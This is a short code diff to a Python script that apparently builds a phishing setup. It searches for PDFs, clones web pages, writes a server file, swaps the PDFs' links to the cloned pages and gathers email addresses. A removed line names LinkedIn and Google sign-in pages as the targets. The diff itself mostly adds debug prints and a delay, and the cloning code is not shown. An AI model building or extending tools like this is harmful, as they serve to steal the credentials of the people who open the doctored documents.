@@ -1,3 +1,4 @@
+from time import sleep
 import PDFProcessor
 import Clone as Builder
 import SearchEngine
@@ -30,7 +31,11 @@ def SearchPdf(keyword):
 
     NamesList=SearchEngine.Search_PDFs(keyword)  
     for fileName in NamesList:
+        print('==============FILE NAME===============')
+        print(fileName)
         fileName=fileName+'.pdf'
+        print('====================================')
+        sleep(5)
         BuildServer(fileName)
     
     GetEmails.GetEmails()
@@ -41,7 +46,6 @@ def SearchPdf(keyword):
 dict={}
 
 
-Links=['https://www.linkedin.com/home/?originalSubdomain=il','https://accounts.google.com/']
 
 i=1
 
@@ -79,8 +83,8 @@ if __name__ == '__main__':\n
     f = open("app.py", "w")
     f.write(Header)
     f.write(Basic)
-    
-    
+    print('===============================Kareem ========')
+    print(Links)
     if Links is not None:
         for link in Links:
             NewFileName=str(i)+'.html'
@@ -96,7 +100,9 @@ if __name__ == '__main__':\n
 
     f.write(End)
     f.close()
-    PDFProcessor.swap_links(dict,fileName)
+    PDFProcessor.swap_links(dict,str(fileName))
     print('Server file was built at app.py')
+
+
 
 SearchPdf(sargs)
